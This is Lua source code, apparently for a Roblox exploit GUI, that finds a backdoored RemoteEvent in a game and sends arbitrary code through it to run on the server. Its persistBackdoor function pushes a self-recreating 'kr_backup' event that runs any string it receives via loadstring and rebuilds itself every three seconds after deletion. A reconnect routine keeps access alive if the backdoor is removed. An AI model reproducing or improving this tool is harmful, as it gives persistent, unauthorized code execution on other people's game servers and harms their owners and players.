local backdoor = nil
local scriptButtons = {}
local persisted = false

local function findBackdoor()
	for _, name in ipairs({"kr_backup", targetName}) do
		local found = ReplicatedStorage:FindFirstChild(name)
		if found and found:IsA("RemoteEvent") then
			return found
		end
	end
	for _, v in pairs(ReplicatedStorage:GetChildren()) do
		if v:IsA("RemoteEvent") then
			return v
		end
	end
	return nil
end

local function updateStatus()
	if backdoor then
		statusDot.BackgroundColor3 = Color3.fromRGB(50, 230, 120)
		statusDotGlow.ImageColor3 = Color3.fromRGB(0, 255, 100)
		statusText.Text = "Connected: " .. backdoor.Name
		statusText.TextColor3 = Color3.fromRGB(120, 230, 150)
	else
		statusDot.BackgroundColor3 = Color3.fromRGB(255, 80, 80)
		statusDotGlow.ImageColor3 = Color3.fromRGB(255, 50, 50)
		statusText.Text = "Offline Mode"
		statusText.TextColor3 = Color3.fromRGB(255, 130, 130)
	end
end

local function execute(code)
	if not backdoor or not backdoor.Parent then
		backdoor = findBackdoor()
		updateStatus()
	end
	if backdoor then
		backdoor:FireServer(code)
		addLog("Executed: " .. string.sub(code, 1, 60) .. (string.len(code) > 60 and "..." or ""), "success")
		notify("Script executed", "success")
	else
		addLog("No backdoor found, cannot execute", "error")
		notify("No backdoor connected", "error")
	end
end

local function persistBackdoor()
	if not backdoor then
		notify("No backdoor to persist", "error")
		return
	end
	if persisted then
		notify("Already persisted", "warn")
		return
	end

	local persistCode = [[
if game.ReplicatedStorage:FindFirstChild("kr_backup") then return end
local backup = Instance.new("RemoteEvent", game.ReplicatedStorage)
backup.Name = "kr_backup"
backup.OnServerEvent:Connect(function(player, SS)
	pcall(function() loadstring(SS)() end)
end)
task.spawn(function()
	while task.wait(3) do
		if not game.ReplicatedStorage:FindFirstChild("kr_backup") then
			local r = Instance.new("RemoteEvent", game.ReplicatedStorage)
			r.Name = "kr_backup"
			r.OnServerEvent:Connect(function(player, SS)
				pcall(function() loadstring(SS)() end)
			end)
		end
	end
end)
]]

	backdoor:FireServer(persistCode)
	addLog("Persist code deployed to server", "success")
	notify("Backup backdoor deployed!", "success")

	task.delay(3, function()
		local backup = ReplicatedStorage:FindFirstChild("kr_backup")
		if backup then
			persisted = true
			addLog("kr_backup confirmed on server", "success")
			notify("Persist confirmed!", "success")
			persistText.Text = "PERSISTED"
			persistText.TextColor3 = Color3.fromRGB(230, 255, 235)
			applyPersistColors(true, false)
		else
			addLog("kr_backup not found, persist may have failed", "warn")
			notify("Persist unconfirmed", "warn")
		end
	end)
end

local function watchBackdoor()
	if not backdoor then return end

	backdoor.AncestryChanged:Connect(function(_, newParent)
		if newParent == nil then
			addLog("Backdoor destroyed! Rescanning...", "error")
			notify("Backdoor lost! Reconnecting...", "error")
			statusDot.BackgroundColor3 = Color3.fromRGB(255, 200, 60)
			statusDotGlow.ImageColor3 = Color3.fromRGB(255, 180, 0)
			statusText.Text = "Reconnecting..."
			statusText.TextColor3 = Color3.fromRGB(255, 220, 100)

			backdoor = nil

			for i = 1, 15 do
				task.wait(2)
				backdoor = findBackdoor()
				if backdoor then break end
			end

			if backdoor then
				updateStatus()
				addLog("Reconnected: " .. backdoor:GetFullName(), "success")
				notify("Reconnected!", "success")
				watchBackdoor()
			else
				updateStatus()
				addLog("Failed to reconnect after 15 retries", "error")
				notify("Connection lost permanently", "error")
			end
		end
	end)
end

